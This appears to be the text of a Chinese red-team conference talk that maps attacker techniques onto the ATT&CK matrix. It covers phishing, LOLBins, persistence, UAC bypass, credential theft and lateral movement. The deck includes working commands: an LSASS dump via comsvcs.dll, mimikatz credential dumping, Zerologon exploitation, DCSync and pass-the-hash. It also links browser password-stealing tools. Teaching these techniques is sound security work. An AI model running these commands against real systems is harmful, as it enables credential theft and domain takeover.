haya
ATT&CK红队战术漫谈
◉ haya
◉ 木星安全实验室 · 红队负责人
◉ Github: https://github.com/hayasec
◉ Blog:  hayasec.me
◉ 红蓝对抗与红队武器化
ABOUT ME
今天聊点啥？
ATT&CK与红队攻击战术漫谈
ATT&CK矩阵(站在攻击者的视角来描述攻击中各阶段用到的技术的模型)
初 始
访 问
执 行
攻 击
权 限
维 持
权 限
提 升
防 御
绕 过
凭 据
获 取
数 据
披 露
横 向
移 动
目 标
数 据
收 集
内 网
数 据
窃 出
偷渡式攻击
外部程序攻击
硬件植入
USB复制
鱼叉式附件
鱼叉式钓鱼
供应链攻击
可信关系
有效帐户
……
命令行界面
编译HTML文件
控制面板项
动态数据交换
通过API执行
通过模块加载执行
利用客户端执行
图形用户界面
LSASS驱动
本地作业任务
计划任务
脚本执行
服务执行
签名二进制代理
签名脚本代理执行
文件名后的空格
第三方软件
Trap程序
可信的开发工具
用户执行
WMI
Win远程管理
XSL脚本处理
…… 
辅助功能
账户操纵
Shimming应用
验证包
BITS任务
浏览器扩展
更改默认文件关联
组件固件
COM劫持
创建账号
DLL顺序劫持
Dylib劫持
外部远程服务
文件系统权限
隐藏文件和目录
挂钩
虚拟机技术
IFEO注入
内核模块和扩展
LSASS驱动
启动Agent
启动守护进程
本地作业调度
……
访问令牌操作
辅助功能
Bypass UAC
DLL搜索劫持
Dylib劫持
漏洞提权
EWM注入
文件系统权限
挂钩
IFEO注入
启动守护进程
新服务
路径拦截
Plist修改
端口监视器
进程注入
SID历史注入
任务计划
服务注册表权限
启动项
Sudo缓存
有效账户
Web Shell
……
账户操纵
Bash历史
暴力破解
凭证转储
文件凭证
注册表凭证
凭证漏洞利用
强制认证
输入捕获
输入提示
LLMNR投毒
网络嗅探
密码筛选器DLL
私钥
安全内存
双因素拦截
……
帐户发现
应用窗口发现
浏览器书签发现
文件和目录发现
网络服务扫描
网络共享发现
密码策略发现
外围设备发现
权限组发现
进程发现
查询注册表
远程系统发现
安全软件发现
系统信息发现
网络配置发现
网络连接发现
系统用户发现
系统服务发现
系统时间发现
……
访问令牌操作
BITS任务
二进制填充
绕过UAC
清除命令历史
代码签名
组件固件
COM劫持
控制面板项
DLL侧载
禁用安全工具
EWM注入
文件删除
文件权限修改
隐藏用户
隐藏窗口
IFEO注入
指标拦截
从主机移除指标
间接命令执行
安装根证书
InstallUtil程序
LC_MAIN劫持
……
AppleScript消息
应用部署软件
分布式对象模型
远程服务漏洞利用
登陆脚本
PtH
PtT
远程桌面协议
远程文件复制
可移动媒体复制
SSH劫持
共享Webroot
污染共享内容
第三方软件
Win管理员共享
Win远程管理
远程服务
……
音频捕获
自动化收集
剪贴板数据
数据整合
存储库数据
本地系统数据
网络驱动器数据
可移动媒体数据
电子邮件收集
输入捕获
浏览器中间人
截屏
视频捕获
…… 
自动化透传
数据压缩
数据加密
数据传输大小限制
透传的备用协议
C2通道进行透传
网络介质透传
物理介质透传
周期传输
…… 
常用端口
可移动媒体通信
代理传输
自定义协议
数据编码
数据混淆
域前置
备用信道
多段信道
多层加密
…… 
影 响
消 除
账户权限删除
数据销毁
磁盘擦除
终端拒绝服务
固件损坏
拒绝系统恢复
资源劫持
服务停止
数据传输操作
…… 
命 令
控 制
● 红队作战攻击重要步骤
● 战术中用到的技术点
● 工具改造与武器化
初始访问@TA0001
初始接入策略代表攻击者用于在网络中取得初始立足点
的(攻击)向量
打点?
初始访问: 打点
薄弱防护系统，边缘业务
同C段同ISP
关键集权系统
供应链
......
注册表
计划任务
初始访问：钓鱼攻击
载荷格式？ 
投递方式？
社工话术？
利用方式？
初始访问: 免杀宏
● VelvetSweatshop
● 诱导
● 白加黑
执行@TA0002
执行策略表示造成在本地或远程系统上执行由攻击者控
制的代码的技术。该策略通常与初始接入一起使用，作
为一旦获得访问就执行代码的手段，之后进行横向移动
以扩展对网络上远程系统的访问。
执行:LOLBINS
● https://github.com/LOLBAS-Project/LOLBAS
lolbins可以是带有Microsoft签名的二进制文件，可以是Microsoft系统目
录中二进制文件。
可以是第三方认证签名程序。
具有对APT或红队渗透方有用的功能。
该程序除过正常的功能外，可以做意料之外的行为。（如：执行恶意代码、
绕过UAC、下载文件、转储进程内存、逃避日志等）。
执行:LOLBINS
执行:LOLBINS
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 
(Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
HKCR\mscfile\shell\open\command --> evil.exe
Sqldumper.exe 592(lsass.exe)
csc.exe
wmic.exe
rundll32.exe
excel.exe
mshta.exe
eventvwr.exe
cmstp.exe
msiexec.exe
sqldumper.exe
sqldumper.exe
at.exe
mmc.exe
......
持久化@TA0003
持久化是指任何对系统的访问，操作或配置更改，使攻
击者在该系统上持续地存在。攻击者通常需要通过中断
来维持对系统的访问，例如系统重启，凭据丢失或其他
需要远程访问工具重新启动或备用后门才能重新获得访
问权限的故障。
持久化
注册表
服务
计划任务
Hijack
WMI
驱动
......
持久化：计划任务
Task Scheduler Interfaces
任务计划程序接口,
提供对Task Scheduler中可用功能的编程访问
 ITaskService, TaskScheduler, go-ole
At
Schtask
Task Scheduler
API
持久化：计划任务
每天启动计划任务
(Scripting)
(C++)
(XML)
持久化：计划任务
C#
TaskScheduler
Execute-assembly
特权提升@TA0004
特权提升是允许攻击者在系统或网络上获得更高级别权
限的结果。某些工具或操作需要更高级别的权限，并且
在特定操作的许多场景很可能都是必需的。
特权提升
UAC(User AccountControl)是从Windows Vista开始出现的安全技术，它通过
限制应用程序的执行权限来达到提升操作系统安全性的目的。
hfiref0x在github上整理了各种UAC绕过技术的实现，并对每个方法进行编号。
漏洞、DLL劫持、可信目录、Com组件接口、注册表等等
https://github.com/hfiref0x/UACME
特权提升：UAC绕过
CSMTPLUA
{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
ICMLuaUtil 
ShellExec
特权提升：UAC绕过
凭据访问@TA0006
凭据访问表示造成访问或控制在企业环境中使用的系统，
域或服务凭据的技术。攻击者可能会尝试从用户或管理
员帐户（具有管理员访问权限的本地系统管理员或域用
户）获取合法凭据，以便在网络中使用。
凭据访问：Mimikatz
◉  PE-loader
● https://github.com/GhostPack/SafetyKatz
● https://github.com/Flangvik/BetterSafetyKatz
◉  Assembly-load
凭据访问：Mimikatz
凭据访问：Mimikatz
凭据访问：Mimikatz
● LLVM 
● YANSOllvm 树内模糊混淆ollvm
● MINGW
凭据访问：Mimikatz
凭据访问：Mimikatz
凭据访问：Mimikatz
披露@TA0007
披露是包括允许攻击者获得有关系统和内部网络的知识
的技术。
披露：浏览器密码
全称Data Protection Application Programming Interface
作为Windows系统的一个数据保护接口被广泛使用
主要用于保护加密的数据，常见的应用如：
EFS文件加密
存储无线连接密码
Windows Credential Manager
Internet Explorer
Outlook
Skype
Windows CardSpace
Windows Vault
Google Chrome
Dpapi采用的加密类型为对称加密，所以只要找到了密钥，就能解开物理存储的加
密信息了。
披露：浏览器密码
披露：浏览器密码
https://github.com/moonD4rk/HackBrowserData
https://github.com/DeEpinGh0st/Browser-cookie-steal
https://github.com/QAX-A-Team/BrowserGhost
......
披露：浏览器密码
Master Key file：二进制文件，可使用用户登录密码对其解密，获得Master Key
Master Key ：用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在
Master Key file中
Preferred文件：位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过
期时间，默认90天有效期
Win32 API 加密函数CryptProtectData 、解密函数 CryptUnprotectData
 ◉ Mimikatz
● sadump::secrets
● sekurlsa::dpapi
◉ SharpDPAPI 
披露：浏览器密码
披露：360安全浏览器密码
https://github.com/hayasec/360SafeBrowsergetpass
披露：360安全浏览器密码
https://github.com/hayasec/360SafeBrowsergetpass
横向移动（Lateral Movement）包括使攻击者能够访问
和控制网络和云上的远程系统的技术，但不一定包括在
远程系统上执行的工具。横向移动技术允许攻击者收集
系统信息而无需额外的工具，如远程访问工具。
横向移动@TA0008
横向移动
当红队已经通过某些途径进入内网以后，已经通过一些方法获取到内网Windows服务器帐号密
码以后，通过这些账与密码去远程控制更多目标服务器的一种行为。
mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full""  exit >> hash.txt
net use \\192.168.1.1\C$ pass /user:administrator
445、1433、3389、6379、1099……
搜集一切有用的信息
Schtasks、Psexec、Impacket、IPC、reg、SC……
横向移动
横向移动：漏洞利用
Zerologon，MS17010，CVE-2019-1040…
lsadump::zerologon /target:DC01.XXX.COM /account:DC01$ /exploit
lsadump::dcsync /domain:XXX.COM /dc:DC01.XXX.COM /user:krbtgt /all /csv /authuser:DC01$ /authdomain:XXX 
/authpassword: /authntlm 
sekurlsa::pth /user:administrator /domain:XXX /rc4:baee64c114772f85cb2c6595d5eeca8d
lsadump::postzerologon /target:192.168.1.4 /account:DC01$
横向移动
◉劫持欺骗
● ARP
● LLMNR Poison
● WPAD
◉ 域
 ● 各种抓密码
 ● 微软“不认”的漏洞
横向移动：横向渗透防护
横向移动：横向渗透防护
横向移动：横向渗透防护Bypass
横向移动：横向渗透防护Bypass
横向移动：横向渗透防护Bypass
横向移动：横向渗透防护Bypass
横向移动：横向渗透防护Bypass
写在最后
Q&A